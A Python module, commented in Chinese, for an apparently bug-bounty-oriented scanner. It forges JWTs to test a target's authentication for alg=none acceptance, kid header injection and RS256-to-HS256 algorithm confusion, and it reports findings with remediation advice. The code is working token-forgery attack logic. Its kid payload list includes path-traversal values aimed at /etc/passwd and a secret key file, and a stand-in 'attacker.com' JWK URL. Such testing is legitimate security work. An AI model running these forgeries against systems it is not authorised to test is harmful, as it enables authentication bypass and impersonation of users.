# -*- coding: utf-8 -*-
from typing import Dict, Any, List, Optional
import base64
import json
import hmac
import hashlib
from urllib.parse import urljoin
from ..base.feature_base import FeatureBase
from ..base.feature_registry import FeatureRegistry
from ..base.result_schema import FeatureResult, Finding
from ..base.http_client import SafeHttp

def b64url_encode(data: bytes) -> str:
    """Base64 URL 安全編碼"""
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def b64url_decode(data: str) -> bytes:
    """Base64 URL 安全解碼"""
    # 補齊填充字元
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)

@FeatureRegistry.register
class JwtConfusionWorker(FeatureBase):
    """
    JWT 混淆攻擊檢測模組
    
    專門檢測 JWT 實作中的常見安全漏洞，這些漏洞一旦成功利用
    通常能獲得完全的身分驗證繞過，在 Bug Bounty 平台屬於高價值目標。
    
    檢測的漏洞類型：
    1. alg=none 漏洞：接受無簽名的 JWT
    2. kid 注入：透過 kid 欄位注入本地檔案路徑或外部資源
    3. RS256 轉 HS256：將非對稱算法偽裝成對稱算法
    4. 弱金鑰或可預測簽名
    
    這些漏洞的共同特點是能完全繞過身分驗證，屬於 P1/P0 級別。
    """
    
    name = "jwt_confusion"
    version = "2.0.0"
    tags = ["jwt", "jwk", "kid", "authentication-bypass", "critical"]

    def run(self, params: Dict[str, Any]) -> FeatureResult:
        """
        執行 JWT 混淆攻擊檢測
        
        Args:
            params: 檢測參數
              - target (str): 基礎 URL
              - validate_endpoint (str): 需要 JWT 驗證的端點，如 /api/me
              - victim_token (str): 合法的低權限 JWT token
              - jwks_url (str): 可選，JWK Set URL
              - attempts (dict): 攻擊類型開關
                - alg_none: 是否測試 alg=none
                - kid_injection: 是否測試 kid 注入
                - symmetric_rs: 是否測試 RS→HS 轉換
              - headers (dict): 額外的請求頭
              
        Returns:
            FeatureResult: 檢測結果
        """
        http = SafeHttp()
        base = params.get("target", "")
        validate_endpoint = params.get("validate_endpoint", "/api/me")
        validate_url = urljoin(base, validate_endpoint)
        token = (params.get("victim_token") or "").strip()
        jwks_url = params.get("jwks_url")
        attempts = params.get("attempts") or {
            "alg_none": True, 
            "kid_injection": True, 
            "symmetric_rs": True
        }
        extra_headers = params.get("headers", {})
        
        findings: List[Finding] = []
        trace = []
        
        cmd = self.build_command_record(
            "jwt.confusion", 
            "JWT 混淆攻擊檢測", 
            {
                "validate_endpoint": validate_endpoint,
                "attacks": list(attempts.keys()),
                "has_jwks": bool(jwks_url)
            }
        )
        
        if not token:
            return FeatureResult(
                False, self.name, cmd, [], 
                {"error": "缺少 victim_token 參數", "trace": trace}
            )
        
        # 解析原始 token
        try:
            header_b64, payload_b64, sig_b64 = token.split(".")
            header = json.loads(b64url_decode(header_b64))
            payload = json.loads(b64url_decode(payload_b64))
        except Exception as e:
            return FeatureResult(
                False, self.name, cmd, [], 
                {"error": f"無效的 JWT 格式: {e}", "trace": trace}
            )
        
        # 驗證原始 token 是否有效（建立基線）
        try:
            baseline_resp = http.request(
                "GET", validate_url, 
                headers={**extra_headers, "Authorization": f"Bearer {token}"}
            )
            trace.append({
                "step": "baseline_validation",
                "status": baseline_resp.status_code,
                "token_valid": baseline_resp.status_code == 200
            })
        except Exception as e:
            trace.append({"step": "baseline_error", "error": str(e)})
            baseline_resp = None
        
        # 1) alg=none 攻擊
        if attempts.get("alg_none"):
            try:
                none_header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
                forged_token = f"{none_header}.{payload_b64}."
                
                ok_status, anon_status = self._validate_token_pair(
                    http, validate_url, extra_headers, forged_token
                )
                
                trace.append({
                    "step": "alg_none_test",
                    "authenticated_status": ok_status,
                    "anonymous_status": anon_status
                })
                
                if ok_status == 200 and anon_status in (401, 403):
                    findings.append(Finding(
                        vuln_type="JWT alg=none Bypass",
                        severity="critical",
                        title="JWT 'none' 演算法被接受，允許無簽名驗證",
                        evidence={
                            "forged_token_sample": f"{forged_token[:80]}...",
                            "validate_status": ok_status,
                            "anonymous_status": anon_status,
                            "original_alg": header.get("alg")
                        },
                        reproduction=[
                            {
                                "step": 1,
                                "description": "構造 alg=none 的 JWT",
                                "request": {
                                    "method": "GET",
                                    "url": validate_url,
                                    "headers": {
                                        "Authorization": f"Bearer {forged_token[:80]}..."
                                    }
                                },
                                "expect": "應拒絕無簽名的 JWT"
                            }
                        ],
                        impact="完全繞過 JWT 身分驗證，攻擊者可偽造任意用戶身分",
                        recommendation="1. 嚴格拒絕 'none' 演算法\n2. 實施演算法白名單\n3. 強制要求簽名驗證\n4. 使用安全的 JWT 函式庫"
                    ))
                    
            except Exception as e:
                trace.append({"step": "alg_none_error", "error": str(e)})
        
        # 2) kid 注入攻擊
        if attempts.get("kid_injection"):
            kid_payloads = [
                "../../../../etc/passwd",
                "/dev/null", 
                "file:/etc/hostname",
                "https://attacker.com/jwk.json",
                "../../../config/secret.key"
            ]
            
            for kid in kid_payloads:
                try:
                    kid_header = b64url_encode(json.dumps({
                        "alg": "HS256", 
                        "typ": "JWT", 
                        "kid": kid
                    }).encode())
                    
                    # 嘗試不同的密鑰猜測策略
                    key_guesses = [
                        b"",  # 空密鑰
                        b"secret",  # 常見弱密鑰
                        kid.encode(),  # kid 本身作為密鑰
                        b"null\x00"  # null 字節
                    ]
                    
                    for key_guess in key_guesses:
                        try:
                            sig = b64url_encode(hmac.new(
                                key_guess, 
                                f"{kid_header}.{payload_b64}".encode(), 
                                hashlib.sha256
                            ).digest())
                            forged_token = f"{kid_header}.{payload_b64}.{sig}"
                            
                            ok_status, anon_status = self._validate_token_pair(
                                http, validate_url, extra_headers, forged_token
                            )
                            
                            trace.append({
                                "step": "kid_injection_test",
                                "kid": kid,
                                "key_guess": key_guess.decode('utf-8', errors='ignore'),
                                "authenticated_status": ok_status,
                                "anonymous_status": anon_status
                            })
                            
                            if ok_status == 200 and anon_status in (401, 403):
                                findings.append(Finding(
                                    vuln_type="JWT kid Injection",
                                    severity="critical", 
                                    title=f"JWT kid 注入成功：{kid}",
                                    evidence={
                                        "kid_payload": kid,
                                        "key_used": key_guess.decode('utf-8', errors='ignore'),
                                        "forged_token_sample": f"{forged_token[:80]}...",
                                        "validate_status": ok_status
                                    },
                                    reproduction=[
                                        {
                                            "step": 1,
                                            "description": f"構造帶有 kid={kid} 的 JWT",
                                            "request": {
                                                "method": "GET",
                                                "url": validate_url,
                                                "headers": {
                                                    "Authorization": f"Bearer {forged_token[:80]}..."
                                                }
                                            },
                                            "expect": "應拒絕或驗證失敗"
                                        }
                                    ],
                                    impact="透過 kid 欄位注入可讀取本地檔案或外部資源作為簽名密鑰，完全繞過驗證",
                                    recommendation="1. 不允許 kid 解析任意資源\n2. 使用預定義的密鑰清單\n3. 驗證 JWK 來源\n4. 實施路徑遍歷防護"
                                ))
                                break  # 找到一個成功的就停止
                                
                        except Exception:
                            continue
                            
                except Exception as e:
                    trace.append({
                        "step": "kid_injection_error", 
                        "kid": kid, 
                        "error": str(e)
                    })
        
        # 3) RS256 轉 HS256 攻擊（非對稱轉對稱）
        if attempts.get("symmetric_rs"):
            try:
                # 將演算法改為 HS256
                hs_header = b64url_encode(json.dumps({
                    "alg": "HS256", 
                    "typ": "JWT"
                }).encode())
                
                # 使用原始 header 作為 HMAC 密鑰（常見錯誤）
                guess_keys = [
                    json.dumps(header).encode(),
                    json.dumps(header, separators=(',', ':')).encode(),
                    str(header).encode()
                ]
                
                for guess_key in guess_keys:
                    try:
                        sig = b64url_encode(hmac.new(
                            guess_key,
                            f"{hs_header}.{payload_b64}".encode(),
                            hashlib.sha256
                        ).digest())
                        forged_token = f"{hs_header}.{payload_b64}.{sig}"
                        
                        ok_status, anon_status = self._validate_token_pair(
                            http, validate_url, extra_headers, forged_token
                        )
                        
                        trace.append({
                            "step": "rs_to_hs_test",
                            "key_material": guess_key.decode('utf-8', errors='ignore')[:100],
                            "authenticated_status": ok_status,
                            "anonymous_status": anon_status
                        })
                        
                        if ok_status == 200 and anon_status in (401, 403):
                            findings.append(Finding(
                                vuln_type="JWT Algorithm Confusion (RS→HS)",
                                severity="critical",
                                title="JWT RS256→HS256 演算法混淆成功",
                                evidence={
                                    "original_alg": header.get("alg"),
                                    "forged_alg": "HS256",
                                    "key_material_used": guess_key.decode('utf-8', errors='ignore')[:200],
                                    "validate_status": ok_status
                                },
                                reproduction=[
                                    {
                                        "step": 1,
                                        "description": "將 RS256 演算法改為 HS256 並用公鑰材料簽名",
                                        "request": {
                                            "method": "GET",
                                            "url": validate_url,
                                            "headers": {
                                                "Authorization": f"Bearer {forged_token[:80]}..."
                                            }
                                        },
                                        "expect": "應拒絕演算法不符的 JWT"
                                    }
                                ],
                                impact="將非對稱演算法偽裝成對稱演算法，使用公開材料作為 HMAC 密鑰完全繞過驗證",
                                recommendation="1. 嚴格綁定預期的演算法\n2. 對不同演算法使用獨立的驗證管道\n3. 不允許演算法動態切換\n4. 驗證密鑰類型與演算法的匹配"
                            ))
                            break
                            
                    except Exception:
                        continue
                        
            except Exception as e:
                trace.append({"step": "rs_to_hs_error", "error": str(e)})
        
        return FeatureResult(
            ok=bool(findings),
            feature=self.name,
            command_record=cmd,
            findings=findings,
            meta={
                "trace": trace,
                "original_header": header,
                "original_payload": payload,
                "attacks_attempted": list(attempts.keys())
            }
        )
    
    def _validate_token_pair(self, http: SafeHttp, url: str, headers: Dict[str, Any], 
                           token: str) -> tuple[int, int]:
        """
        驗證 token 的有效性，同時測試帶 token 和不帶 token 的情況
        
        Returns:
            (帶token的狀態碼, 不帶token的狀態碼)
        """
        try:
            # 帶 token 的請求
            auth_resp = http.request(
                "GET", url, 
                headers={**headers, "Authorization": f"Bearer {token}"}
            )
            auth_status = auth_resp.status_code
        except Exception:
            auth_status = 0
        
        try:
            # 不帶 token 的請求（匿名）
            anon_resp = http.request("GET", url, headers=headers)
            anon_status = anon_resp.status_code
        except Exception:
            anon_status = 0
        
        return auth_status, anon_status